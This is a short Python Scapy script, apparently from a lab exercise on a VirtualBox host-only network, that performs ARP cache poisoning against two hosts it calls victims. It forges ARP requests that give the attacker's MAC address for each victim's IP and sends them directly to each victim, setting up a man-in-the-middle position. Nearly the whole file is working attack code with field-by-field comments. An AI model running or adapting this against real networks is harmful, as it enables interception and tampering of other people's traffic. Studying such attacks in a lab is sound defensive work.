from scapy.all import *

# hwdst='00:00:00:00:00:00'    destination hardware address = empty as this is an arp request
# pdst='10.20.48.2'	       destination protocol (ipv4) address mac address you want to know for [ip address of victim 1]
# hwsrc='0A:00:27:00:00:00'    source hardware address = mac address of the sender or the request issuer [ mac address of attacker (fedora) ]
# psrc='10.20.48.5'         source protocol (ipv4) address of the sender or the request issuer [ ip address of attacker victim 2 ]
# op='who-has'                 operation code for arp request

p = ARP(hwdst='00:00:00:00:00:00',pdst='10.20.48.2',hwsrc='0A:00:27:00:00:00',psrc='10.20.48.5',op='who-has')

# dst='08:00:27:A2:16:81'     destination address for ethernet segment [ destinatio address of victim 1 ]
# although broadcasting arp request will also work but we used directed packet to victim 1

pack = Ether(dst='08:00:27:A2:16:81')/p

print '{0}'.format(repr(pack))

# sending datalink layer segment ( ethernet segment )
# interface = vboxnet0
sendp(pack,iface='vboxnet0')

# now poisioning arp table of another victim

# hwdst='00:00:00:00:00:00'    destination hardware address = empty as this is an arp request
# pdst='10.20.48.5'         destination protocol (ipv4) address mac address you want to know for [ip addres$
# hwsrc='0A:00:27:00:00:00'    source hardware address = mac address of the sender or the request issuer [ mac$
# psrc='10.20.48.2'         source protocol (ipv4) address of the sender or the request issuer [ ip address$
# op='who-has'                 operation code for arp request

p = ARP(hwdst='00:00:00:00:00:00',pdst='10.20.48.5',hwsrc='0A:00:27:00:00:00',psrc='10.20.48.2',op='who-has')

# dst='08:00:27:2B:F7:7A'     destination address for ethernet segment [ destinatio address of victim 1 ]
# although broadcasting arp request will also work but we used directed packet to victim 1

pack = Ether(dst='08:00:27:2B:F7:7A')/p

print '{0}'.format(repr(pack))

# sending datalink layer segment ( ethernet segment )
# interface = vboxnet0
sendp(pack,iface='vboxnet0')
